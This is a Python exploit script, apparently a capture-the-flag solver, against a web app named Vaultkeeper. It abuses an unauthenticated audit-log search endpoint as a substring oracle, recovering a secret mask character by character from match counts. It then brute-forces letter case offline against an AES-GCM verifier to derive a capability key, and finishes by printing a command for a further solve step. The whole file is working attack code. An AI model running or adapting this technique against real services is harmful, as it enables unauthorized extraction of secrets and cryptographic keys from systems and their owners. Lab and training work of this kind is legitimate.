#!/usr/bin/env python3
"""
Vaultkeeper: the audit_search substring oracle. Not loopback gated, needs no
capability.

    $lines = vk_audit_tail($limit);                       // limit up to 500
    $lines = array_filter($lines, fn($l) => stripos($l, $q) !== false);
    vk_json(['q' => $q, 'count' => count($lines), 'events' => $lines]);

stripos is case-insensitive substring and `count` comes straight back, so it's a
free prefix oracle over everything ever written to /var/www/data/audit.log. Only
pays if the deployed build logs key material. The handout logs webhook.test,
key.rotate and key.save, none of which touch the mask, so step 1 is one request
that settles it.
"""
import argparse
import base64
import itertools
import json
import os
import string
import sys
import time

import requests

ALNUM = string.digits + string.ascii_lowercase          # case folded alphabet
HERE = os.path.dirname(os.path.abspath(__file__))
S = requests.Session()


def search(base, q, limit=500, tries=3):
    for _ in range(tries):
        try:
            r = S.get(base.rstrip("/") + "/api/audit_search.php",
                      params={"q": q, "limit": limit}, timeout=25)
            return r.json()
        except Exception:
            time.sleep(2)
    return {}


def look(base):
    """One request each. Does the deployed build log anything worth walking?"""
    try:
        tail = S.get(base.rstrip("/") + "/api/audit.php", timeout=25).json()
    except Exception as e:  # noqa: BLE001
        print("[-] audit.php: %r" % e)
        return
    ev = tail.get("events", [])
    print("[*] audit.php returned %d lines" % len(ev))
    for line in ev[-25:]:
        print("    " + str(line)[:220])
    kinds = set()
    for line in ev:
        try:
            kinds.add(json.loads(line).get("event"))
        except Exception:
            pass
    print("[*] distinct event kinds: %s" % sorted(k for k in kinds if k))
    for q in ("mask", "cap", "unseal", "seal", "peer", "handshake", "key",
              "secret", "ref", "slot", "operator", "maintainer"):
        j = search(base, q)
        print("[*] q=%-10s count=%s" % (q, j.get("count")))
        time.sleep(0.3)


def walk(base, anchor, length=16, alphabet=ALNUM):
    """Extend `anchor` one character at a time while count stays positive."""
    known = ""
    base_count = search(base, anchor).get("count", 0)
    print("[*] anchor %r matches %d lines" % (anchor, base_count))
    if not base_count:
        print("[-] anchor does not appear in the log, nothing to walk")
        return ""
    for pos in range(length):
        hit = None
        for c in alphabet:
            j = search(base, anchor + known + c)
            if j.get("count", 0) > 0:
                hit = c
                break
            time.sleep(0.15)
        if hit is None:
            print("[-] stalled at position %d, recovered %r" % (pos, known))
            break
        known += hit
        print("[+] %2d %r" % (pos, known), flush=True)
    return known


def case_resolve(folded, cap_key_masked_b64, read_capability_b64):
    """Settle the 2**16 case assignments offline against the GCM verifier."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    raw = base64.b64decode(read_capability_b64)
    nonce, ct, tag = raw[:12], raw[12:28], raw[28:44]
    masked = base64.b64decode(cap_key_masked_b64)
    letters = [i for i, c in enumerate(folded) if c.isalpha()]
    for bits in itertools.product((0, 1), repeat=len(letters)):
        cand = list(folded)
        for i, b in zip(letters, bits):
            if b:
                cand[i] = cand[i].upper()
        mask = "".join(cand).encode()
        key = bytes(a ^ b for a, b in zip(masked, mask))
        try:
            if AESGCM(key).decrypt(nonce, ct + tag, None) == b"viewer          ":
                return mask.decode(), key.decode("latin1")
        except Exception:
            pass
    return None, None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--look", action="store_true")
    ap.add_argument("--walk", action="store_true")
    ap.add_argument("--anchor", default='"mask":"')
    ap.add_argument("--length", type=int, default=16)
    ap.add_argument("--masked", default="", help="cap_key_masked base64")
    ap.add_argument("--readcap", default="", help="read_capability base64")
    a = ap.parse_args()
    if a.look or not a.walk:
        look(a.base)
    if a.walk:
        folded = walk(a.base, a.anchor, a.length)
        print("[=] case folded: %r" % folded)
        if folded and a.masked and a.readcap:
            m, k = case_resolve(folded, a.masked, a.readcap)
            print("[=] mask=%r cap_key=%r" % (m, k))
            if m:
                print("\n[!] run: ctf-python solve.py --base %s --redir <tunnel> --mask '%s'"
                      % (a.base, m))


if __name__ == "__main__":
    main()
